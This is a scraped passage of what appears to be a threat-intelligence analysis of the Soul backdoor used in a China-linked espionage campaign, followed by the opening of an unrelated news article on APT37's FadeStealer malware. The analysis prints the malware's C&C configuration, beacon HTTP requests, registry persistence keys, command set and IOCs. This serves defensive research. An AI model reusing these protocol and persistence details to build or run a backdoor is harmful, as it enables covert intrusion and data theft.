Vietnamese targets. None of these public reports attributed the Soul framework to any specific country or known actor, although researchers noted the “competent adversarial tradecraft” which they believed indicated a “possibly state-sponsored” group.In this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes implemented in the Soul framework. We also discuss the challenges in attributing these attacks.DownloaderThe downloader, which in this specific case was dropped by RoyalRoad RTF to the disk asres6.a, is executed by a scheduled task withrundll32.exe, StartA. Its functionality is consistent with previousresearchof Sharp Panda activity. Similar to previous Sharp Panda campaigns, the C&C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where the targets are located.In the latest campaign, the actors implemented some changes in the downloader’s communication with the C&C. Previously, the entire C&C communication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload which contained the hostname in plain text in the URI:/[**hostname]**.html.However, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its parameter, both MD5-hashed and in clear-text:[host_name]*[host_name_md5], e.g.MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4and then encoded:/[php_name].php?Data=[encoded<host_name_and_host_md5>]It’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases.In addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent“Microsoft Internet Explorer”and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is quite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value:Figure 2 – String decryption routine in the newest version of 5.t Downloader.As in previous versions, the downloader gathers data from the victim’s computer including hostname, OS name and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim’s machine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from theStartWexport function (the same name as the next stage loader export in previous campaigns that used the downloader).SoulSearcher loaderSoulSearcher is a second-stage loader, which according to Fortinetresearchwas seen in the wild since at least November 2018 and is responsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the configuration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have been researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in XML format.The malware checks if it runs under a process namedsvchost.exe,msdtc.exeorspoolsv.exe. If it does, it starts a thread onStartWexport and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than we observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders fromStartW.The payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry pathHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\CONFIGEX. The decoded data blob can be represented with the following struct:struct compressed_data
{
  DWORD magic;
  DWORD unused;
  BYTE lzma_properties[5];
  DWORD size;
  DWORD compressed_size;
  BYTE decompressed_data_MD5[33];
  BYTE compressed_data_MD5[33];
  BYTE compressed_data[];
};The loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay.Next, based on the system architecture, SoulSearcher appends32or64to the wide stringL'ServerBase', hashes the resulting string with MD5, and creates the registry key with this hash:HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies\[ServerBaseArch_md5]. The value contains the compressed payload.If the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading process itself is not different from previously discussed variants of SoulSearcher: it uses thecompressed_datastructure from the configuration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in memory.After loading the backdoor, Soul Searcher resolves theConstructexport of the backdoor and calls it with the arguments[ServerBaseArch_md5] -Startup.Soul Backdoor (main module)The Soul main module is responsible for communicating with the C&C server and its primary purpose is to receive and load in memory additional modules. Interestingly, the backdoor configuration contains a “radio silence”-like feature, where the actors can specify specific hours in a week when the backdoor is not allowed to communicate with the C&C server.The recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was compiled on29/11/2022 02:12:34 UTC. Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.The backdoor implements a custom C&C protocol, which is entirely different than previously observed versions. Both the old and new versions are based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such asGET,POST, andDELETE. The API endpoints are also different, and the C&C requests contain additional HTTP request headers. In terms of the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&C commands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like manipulating local files, sending files to the C&C, and executing remote commands.Configuration and execution flowThe backdoor requires two arguments or the“-v”argument before performing its activity. As we mentioned earlier, in our case it is executed by SoulSearcher with[ServerBaseArch_md5] -Startuparguments.Soul backdoor first creates an event using the hardcoded nameGlobal\3GS7JR4Sand checks the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF. It then uses the same configuration (from the registry keyHKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\CONFIGEX) with thecompressed_datastruct (as used by SoulSearcher) to extract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&C communication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After decompression, the config looks like this:<CONFIG FLAG=""X6bmLMbAL29AlxB"">
  <BASE>
    <Ip>http://103.159.132.96/index.php</Ip>
    <Dns>8.8.8.8|114.114.114.114|</Dns>
    <Proxy></Proxy>
    <CntPort>80|443</CntPort>
    <LstPort>0</LstPort>
    <Blog>NULL</Blog>
    <DropboxBlog>NULL</DropboxBlog>
    <HTTPS>false</HTTPS>
  </BASE>
  <SVC>
    <SvcName>IKEEXT</SvcName>
    <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>
    <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>
    <SvcDll>wlbsctrl.dll</SvcDll>
  </SVC>
  <ADV>
    <OlPass>NULL</OlPass>
    <OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</OlTime>
    <SelfDestroy>2029-07-11 15:29:32</SelfDestroy>
  </ADV>
</CONFIG>In its base (<BASE>) settings, the configuration contains the parameter “LstPort”. In the previous versions, this provided the backdoor the ability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively connect to the C&C server using the URL provided in the “IP” parameter on the “connect” port “Cnt”.In the “advanced” section (<ADV>) of the configuration, the “OlTime” parameter contains a list of 168 (24×7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a “blocked” hour, and one represents an “allowed” hour. This way the operators of the malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If theOlTimefield is empty in the config, a default setting is for all days and hours to be configured as “allowed”. This is an advanced OpSec feature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being detected. The “service” (<SVC>) section defines the parameters for the backdoor to be installed as a service:<SVC>
    <SvcName>IKEEXT</SvcName>
    <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>
    <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>
    <SvcDll>wlbsctrl.dll</SvcDll>
  </SVC>The Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that implements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation ofIKEEXT DLL Hijacking, when on the start of the IKEEXT service,svchost.exewould load the malicious DLL, saved aswlbsctrl.dll.After loading and parsing the configuration the backdoor checks the registryHKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\Assembliesfor the existence of a key with the name of MD5 hash of the wide stringL""AutoRun"". If it exists, the backdoor decompresses, loads in memory, and executes theConstructexport of the DLL stored in this key. Although we didn’t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing specific actions prior to the main backdoor activity.After all of these steps are concluded, the backdoor begins the execution of its main thread.C&C communicationThe main thread begins by validating that it received from the configuration the C&C URL and DNS (or blog URL, which is empty in our case), and that the C&C URL starts withhttp://,https://orftp://. In this specific sample, we did not observe any type of FTP communication capabilities. Then, if the current hour is “allowed” byOlTimeconfiguration, it begins the C&C communication.Bot registration and victim fingerprintingThe first request is sent to the specified URL with theClientHelloparameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 (d41d8cd98f00b204e9800998ecf8427e) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t change between the requests.GET /index.php?ClientHello HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
MD5: d41d8cd98f00b204e9800998ecf8427e
Content-Length: 0
Host: 103.159.132.96The expected response from the C&C server isERR! ParamError!In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the config.Figure 3 – C&C DNS resolutionIf the response is correct, it saves the C&C IP address in this format:SVR:[IP_field_from_config]:[CntPort]to the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\SVIF.Next, the module performs a full system enumeration and collects the following data:Processor name and the number of processors, total physical memory and total available physical memory, and information about the hard disk such as total space and free space.The OS architecture and various information from theHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersionregistry key such as ProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.Computer name and information about the current user, such as admin rights retrieved withNetUserGetInfo API.Time zone information from bothHKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation and HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zonesregistry.Local IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such ashttps://www.whatismyip.com/:Figure 4 – Victim machine enumeration data stringAfter the system enumeration, the backdoor generates abotUUID, concatenating with “-” two MD5 strings based on various parameters from the enumerated data. It saves thebotUUIDto the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\UUID. The resultingbotUUIDlooks like this:5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7and is used in all the following network requests.New C&C connectionAfter the system enumeration, the backdoor issues a series of requests to “register” a new connection and perform validation against the C&C server.First, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:DELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1The accepted response from the C&C:OK!Next, theConnectrequest is sent, whose body contained Base64 of the stringConnectXXXXXXXX, whereXXXXXXXXis the connection timestamp retrieved byGetTickCount()API.POST /index.php?[botUUID]/REQ.dat HTTP/1.1

[Base64-encoded string]The accepted response from the C&C:OK!The following request prepares the server to receive the enumeration data from the victim’s machine:GET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1The accepted response from the C&C is a string that looks like this:./Updata/[botUUID]_[connection_timestamp].txt.This is most likely the path on the server to store the enumeration data.After this the backdoor sends another network request, possibly for verification:GET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1The accepted response is a base64-encoded string that contains the botUUID.At the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C server and continues sending information about the system.Send enumerated dataFrom this point on, the data sent between the backdoor and the C&C server relies on another struct,c2_body:struct c2_body
{
  DWORD special_flag;
  DWORD additional_data;
  DWORD const_float;
  BYTE command_id;
};const_float, where used, is a hardcoded value, 5.2509999.special_flagandadditional_dataseem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously describedcompressed_datastruct from SoulSearcher, and then encoded with Base64.First, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved byGetTickCount()API).POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1

[base64-encoded and compressed c2_body]In this request,special_flagis 0x00,command_idis 0x01 andadditonal_datais the tick count. The accepted response isOK!Otherwise, the backdoor sleeps and starts the connection from the beginning.Next, the backdoor collects the enumeration data again, and compresses it using another struct:struct enum_compressed_data
{
  c2_body c2_msg;
  compressed_data enum_data;
};The struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1
[base64-encoded and compressed enum_compressed_data]Thecommand_idis the same 0x01,special_flag=0,additional_data= 0x4000 + 0x49 = size of enum data.The accepted response is alsoOK!Main C&C loopAfter posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the commands:GET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1If there is no C&C command for the victim, the server responds withERR! Path not found, WAIT!If there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed withcompressed_dataand parsed asc2_body. Then thecommand_idfrom the struct is translated to the actual command execution.Soul Backdoor CommandsThe main commands that can be received from the C&C server are control messages for the bot:Command IDActionDescription0x04Execute commandCreate a thread that handles commands from the second set of commands.0x0DClient keep-aliveMirror the request from the C&C server.0x0ERestart C&C sessionSend DELETE request and restart the communication from client Hello.0x0FExitSend DELETE request and exit process forcefully.If in thec2_bodythespecial_flagis set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server should respond with a module name to be loaded from theComputer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assembliesregistry key, which is executed from itsConstructexport. Then the backdoor proceeds to execute the command specified incommand_id.If the command_id is0x04, the backdoor spawns a new “command execution” thread that performs a similar network communication flow as the main thread, only without sending the enumeration data.It then begins handling the following commands:Command IDActionDescription0xFExit threadIf thecommand_flagis on stop, exit the “command execution” thread. Otherwise do nothing0x61Install modulesThe server sends the number of modules to be written to the registry. Then the bot makes requests to the C&C server, once per module and writes it to a specified registry key. Validate the result by executing command0x65afterward.All the registry keys are underComputer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies.0x62Delete modulesDelete registry keys that are sent by the C&C in a string separated by semi-colons (;). Validate the result by executing command0x65afterward.0x63Validate modulesValidate that modules are currently compatible with the system architecture. The modules are located in the registry, and registry keys names are sent by the C&C separated by a semi-colon.0x64Load moduleLoad the specified module and call its export functionConstruct. The registry key where the module is stored is sent by the C&C server.0x65Enumerate modulesCreate a buffer with all registry keys underComputer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assembliesin the format of%s:%f:;(key name and first 4 bytes of the value), then send the buffer back to the C&C.All the received modules are stored compressed in the registry. The decompression is performed according to another struct:struct stored_module
{
  float version_or_id;
  QWORD decompressed_size;
  QWORD compressed_size;
  BYTE md5sum[33];
  BYTE compressed_data[];
};We didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.AttributionAs the first stages of the infection chain are identical to the previously described Sharp Panda activity, many of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this report:The RoyalRoad RTF kit was reported as the tool of choice among Chinese APT groups and is still used despite the exploitation of old patched vulnerabilities. This implies that at least a portion of the attacks using it are successful, and the threat actors are familiar with the cybersecurity practices of their targets.Over the past several years, the C&C servers consistently return payloads only between 01:00 – 08:00 UTC Monday-Friday, which we believe represents the actors’ working hours.The C&C servers did not return payloads during the period of theChinese Spring Festival, even during working hours.The victimology of the attacks is consistent with Chinese interests in Southeast Asian countries, particularly those with similar territorial claims or strategic infrastructure projects.In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese114DNSFree Public DNS service which is not commonly used outside the region.The campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or operational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different toolsets from two previously not connected clusters (Sharp Panda and previous attacks using the Soul framework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following:Infrastructure: One of the IP addresses used by Sharp Panda’s initial infection in late 2021 overlaps with the IP reportedly used by TAG-16 in the same timeframe. In the relevantreport, the Insikt Group researchers provided evidence suggesting that TAG-16 shares custom capabilities with the People’s Liberation Army (PLA)-linked activity group RedFoxtrot.The Southeast Asian government entity attacked in the described campaign was also targeted by a toolattributedto a Chinese-linked APT group during the same time period. However, there is currently no clear evidence to tie the tool to this campaign with high confidence.Symantec researchers alsodiscoveredthe APT30 toolset in the network of one of the organizations attacked with the Soul framework in the same timeframe, with no distinctive connection as well.The vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state threat actors.ConclusionIn this report, we analyzed the TTPs and the tools used in the espionage campaign against Southeast Asian government entities. The initial infection stages of this campaign use TTPs and tools consistent with Sharp Panda activity first discovered in 2021. We continue to track Sharp Panda as a separate unknown cluster, and based on our current insight into this threat, we cannot confirm with high confidence their relation to other Chinese threat actors.The later stages of the infection chain in the described campaign are based on Soul, a previously unattributed modular malware framework. While the Soul framework has been in use since at least 2017, the threat actors behind it have been constantly updating and refining its architecture and capabilities. Based on the technical findings presented in our research, we believe this campaign is staged by advanced Chinese-backed threat actors, whose other tools, capabilities, and position within the broader network of espionage activities are yet to be explored.IOCsC&C servers45.76.190[.]21045.197.132[.]6845.197.133[.]23103.78.242[.]11103.159.132[.]96103.173.154[.]168103.213.247[.]48139.180.137[.]73139.180.138[.]49152.32.243[.]17office.oiqezet[.]comHashesPhishing documents32a0f6276fea9fe5ee2ffda461494a24a5b1f163a300bc8edd3b33c9c6cc2d17ca7f297dc04acad2fab04d5dc2de9475aed4186805f6c237c10b8f56b384cf30341dee709285286bc5ba94d14d1bce8a6416cb93a054bd183b501552a17ef3149d628750295f5cde72f16da02c430b5476f6f47360d008911891fdb5b14a1a01811a020b0f0bb31494f7fbe21893594cd44d90f77fcd1f257925c4ac5fabed43b023e2b398d552aacb2233a6e08b4734c205ab6abf5382ec31e6d5aa7c71c1cbExternal template (RoyalRoad RTF)81d9e75d279a953789cbbe9ae62ce0ed625b61d123fef8ffe49323a04fecdb3f12c1a4c6406ff378e8673a20784c21fb997180cd333f4ef96ed4873530baa8d3f2779c63373e33fdbd001f336df36b01b0360cd6787c1cd29a6524cc7bcf1ffb7a7e519f82af8091b9ddd14e765357e8900522d422606aefda949270b9bf1a044747e6a62fee668593ceebf62f441032f7999e00a0dfd758ea5105c1feb722253541f3d15698711d022541fb222a157196b5c21be4f01c5645c6a161813e85eb5.t Downloader0f9f85d41da21781933e33dddcc5f516c5ec07cc5b4cff53ba388467bc6ac3fd17f4a21e0e8c0ce958baf34e45a8b9481819b9b739f3e48c6ba9a6633cf85b0ef8622a502209c18055a308022629432d82f823dd449abd9b17c61e363a8908281a15a35065ec7c2217ca6a4354877e6a1de610861311174984232ba5ff749114065d399f6e84560e9c82831f9f2a2a43a7d853a27e922cc81d3bc5fcd1adfc561e18314390302cd7181b710a03a456de821ad85334acfb55f535d311dd6b3d65c4500ad141c595d83f8dba52fa7a1456959fb0bc2ee6b0d0f687336f51e1c14e390e6820b2cc173cfd07bcebd67197c595f4705cda7489f4bc44c933ddcf8de6SoulSearcherd1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0Soul Backdoordf5fe7ec6ecca27d3affc901cb06b27dc63de9ea8c97b87bc899a79eca951d60GO UPBACK TO ALL POSTSPOPULAR POSTSArtificial IntelligenceChatGPTCheck Point Research PublicationsOPWNAI : Cybercriminals Starting to Use ChatGPTCheck Point Research PublicationsThreat ResearchHacking Fortnite AccountsArtificial IntelligenceChatGPTCheck Point Research PublicationsOpwnAI: AI That Can Save the Day or HACK it AwayBLOGS AND PUBLICATIONSCheck Point Research PublicationsGlobal Cyber Attack ReportsThreat ResearchFebruary 17, 2020“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing CampaignCheck Point Research PublicationsAugust 11, 2017“The Next WannaCry” Vulnerability is HereCheck Point Research PublicationsJanuary 11, 2018‘RubyMiner’ Cryptominer Affects 30% of WW NetworksPublicationsGlobal cyber attack reportsResearch publicationsIPS advisoriesCheck point blogDemosToolsSandblast file analysisThreatCloudThreat IntelligenceZero day protectionLive threat mapAbout UsContact UsLet’s get in touchSubscribe for cpr blogs, news and moreSubscribe Now© 1994-2024 Check Point Software Technologies LTD. All rights reserved.Property ofCheckPoint.comPrivacy PolicySUBSCRIBE TO CYBER INTELLIGENCE REPORTSFirst NameLast NameCountry—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)EmailWe value your privacy!BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.ACCEPTREJECT"
https://www.bleepingcomputer.com/news/security/apt37-hackers-deploy-new-fadestealer-eavesdropping-malware/,"National Public Data confirms breach exposing Social Security numbers Microsoft removes FAT32 partition size limit in Windows 11 Microsoft disables BitLocker security fix, advises manual mitigation Ransomware gang deploys new malware to kill security software See how studying advanced Excel could save you time in this course deal New Mad Liberator gang uses fake Windows update screen to hide data theft Azure domains and Google abused to spread disinformation and malware Turn complex projects into solutions with this Microsoft Project deal How to access the Dark Web using the Tor Browser How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11 How to use the Windows Registry Editor How to backup and restore the Windows Registry How to start Windows in Safe Mode How to remove a Trojan, Virus, Worm, or other Malware How to show hidden files in Windows 7 How to see hidden files in Windows Remove the Theonlinesearch.com Search Redirect Remove the Smartwebfinder.com Search Redirect How to remove the PBlock+ adware browser extension Remove the Toksearches.xyz Search Redirect Remove Security Tool and SecurityTool (Uninstall Guide) How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo How to remove Antivirus 2009 (Uninstall Instructions) How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller Locky Ransomware Information, Help Guide, and FAQ CryptoLocker Ransomware Information Guide and FAQ CryptorBit and HowDecrypt Information Guide and FAQ CryptoDefense and How_Decrypt Ransomware Information Guide and FAQ Qualys BrowserCheck STOPDecrypter AuroraDecrypter FilesLockerDecrypter AdwCleaner ComboFix RKill Junkware Removal Tool eLearning IT Certification Courses Gear + Gadgets Security Best VPNs How to change IP address Access the dark web safely Best VPN for YouTube  The North Korean APT37 hacking group uses a new 'FadeStealer' information-stealing malware containing a 'wiretapping' feature, allowing the threat actor to snoop and record from victims' microphones. APT37, also known as StarCruft, Reaper, or RedEyes, is believed to be a state-sponsored hacking group with a long history of conducting cyber espionage attacks aligned with North Korean interests. These attacks target North Korean defectors, educational institutions, and EU-based organizations. In the past, the hackers were known to utilize custom malware called 'Dolphin' and 'M2RAT' to execute commands and steal data, credentials, and screenshots from Windows devices and even connected mobile phones. In anew reportfrom the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new custom malware dubbed 'AblyGo backdoor' and 'FadeStealer' that the threat actors use in cyber espionage attacks. The malware is believed to be delivered using phishing emails with attached archives containing password-protected Word and Hangul Word Processor documents (.docx and .hwp files) and a 'password.chm' Windows CHM file. ASEC believes that the phishing emails instruct the recipient to open the CHM file to obtain the password for the documents, which begins the infection process on the Windows device. Once the CHM file is opened, it will display the alleged password to open the document but also quietly downloads and executes a remote PowerShell script that contains backdoor functionality and is registered to autostart with Windows. This PowerShell backdoor communicates with the attackers' command and control servers and executes any commands sent by the attackers. The backdoor is used to deploy an additional GoLang backdoor used in the later stages of the attack to conduct privilege escalation, data theft, and the delivery of further malware. This new backdoor is named 'AblyGo backdoor,' as it uses theAbly Platform, an API service that allows developers to deploy real-time features and information delivery in their applications. The threat actors use ABLY as a command and control platform to send base64-encoded commands to the backdoor to execute and then to receive any output, where the threat actors later retrieve it. As this is a legitimate platform, it is likely used by the threat actors to evade network monitoring and security software. ASEC gained access to the Ably API key used by the backdoor and could monitor some of the commands issued by the attackers. These commands illustrated how the hackers used the backdoor to list the files in a directory, rename a fake .jpg file to an .exe file, and then execute it. However, it is technically possible for the threat actor to send any command they wish to execute. Ultimately, the backdoors deploy a final payload in the form of 'FadeStealer,' an information-stealing malware capable of stealing a wide variety of information from Windows devices. When installed, FadeStealer is injected using DLL sideloading into the legitimate Internet Explorer 'ieinstall.exe' process and begins stealing data from the device and storing them in RAR archives every 30 minutes. The data includes screenshots, logged keystrokes, files collected from connected smartphones, and removable devices. The malware also includes the ability to record audio from a connected microphone, enabling the threat actors to listen in on conversations. This data is collected in the following %Temp% folders: The threat actors can then analyze this collected data to steal sensitive information for use by the North Korean government or conduct further attacks. APT37 is not the only North Korean threat actor utilizing CHM files to deploy malware. ASEC alsoreported todaythat the Kimsuky state-sponsored hacking group is utilizing CHM files in phishing attacks to deploy malicious scripts that steal user information and install additional malware. ""If you examine the overall attack flow in this case, the threat actor carried out their attack cleverly and precisely by employing spear phishing emails to gain access to target systems and using an Ably channel as a command-and-control server,"" concluded the researchers. ""These sorts of attacks are difficult for individuals to notice."" Azure domains and Google abused to spread disinformation and malware Hackers posing as Ukraine’s Security Service infect 100 govt PCs New LianSpy malware hides by blocking Android security feature New CMoon USB worm targets Russians in data theft attacks Ransomware gang targets IT workers with new SharpRhino malware Not a member yet?Register Now New Mad Liberator gang uses fake Windows update screen to hide data theft Microsoft: Enable MFA or lose access to admin portals in October Terms of Use-Privacy Policy-Ethics Statement-Affiliate Disclosure Copyright @ 2003 - 2024Bleeping Computer®LLC- All Rights Reserved Not a member yet?Register Now Read ourposting guidelineseto learn what content is prohibited.",          Home News Security APT37 hackers deploy new FadeStealer eavesdropping malware Lawrence Abrams Lawrence Abrams  Community Rules     ,"APT37 hackers deploy new FadeStealer eavesdropping malwareNewsFeaturedLatestNational Public Data confirms breach exposing Social Security numbersMicrosoft removes FAT32 partition size limit in Windows 11Microsoft disables BitLocker security fix, advises manual mitigationRansomware gang deploys new malware to kill security softwareSee how studying advanced Excel could save you time in this course dealNew Mad Liberator gang uses fake Windows update screen to hide data theftAzure domains and Google abused to spread disinformation and malwareTurn complex projects into solutions with this Microsoft Project dealTutorialsLatestPopularHow to access the Dark Web using the Tor BrowserHow to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11How to use the Windows Registry EditorHow to backup and restore the Windows RegistryHow to start Windows in Safe ModeHow to remove a 